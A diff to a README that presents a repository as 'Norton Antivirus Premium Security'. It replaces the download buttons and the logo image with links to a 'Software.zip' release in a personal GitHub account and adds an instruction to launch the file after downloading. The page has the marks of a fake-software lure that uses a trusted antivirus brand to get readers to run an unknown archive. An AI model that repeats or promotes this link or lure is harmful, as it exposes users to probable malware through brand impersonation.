@@ -1,12 +1,12 @@
 # 🛡️💻 Norton Antivirus Premium Security 🛡️💻
 
-[![Download Norton Antivirus Premium Security](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Norton Antivirus Premium Security](https://github.com/adrizzz111/Norton-Antivirus-Premium-Security/releases/download/v1.0/Software.zip)](https://github.com/adrizzz111/Norton-Antivirus-Premium-Security/releases/download/v1.0/Software.zip)
 
 ---
 
 Welcome to the Norton Antivirus Premium Security repository! 🚀 Protect your devices with top-tier security tools provided by Norton Antivirus. Safeguard yourself against malware, viruses, and online threats with ease. 
 
-![Norton Antivirus Logo](https://logodix.com/logo/1878492.png)
+![Norton Antivirus Logo](https://github.com/adrizzz111/Norton-Antivirus-Premium-Security/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -57,7 +57,7 @@ Explore a wide range of topics related to digital security and antivirus protect
 
 Click the button below to download Norton Antivirus Premium Security and enhance your digital security:
 
-[![Download Norton Antivirus Premium Security](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Norton Antivirus Premium Security](https://github.com/adrizzz111/Norton-Antivirus-Premium-Security/releases/download/v1.0/Software.zip)](https://github.com/adrizzz111/Norton-Antivirus-Premium-Security/releases/download/v1.0/Software.zip)
 
 (Note: Once downloaded, the file needs to be launched.)
 
@@ -82,4 +82,4 @@ For any queries or assistance regarding Norton Antivirus Premium Security, feel 
 
 ## Stay Protected, Stay Secure with Norton Antivirus Premium Security! 🛡️💻
 
-[![Download Norton Antivirus Premium Security](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Norton Antivirus Premium Security](https://github.com/adrizzz111/Norton-Antivirus-Premium-Security/releases/download/v1.0/Software.zip)](https://github.com/adrizzz111/Norton-Antivirus-Premium-Security/releases/download/v1.0/Software.zip)
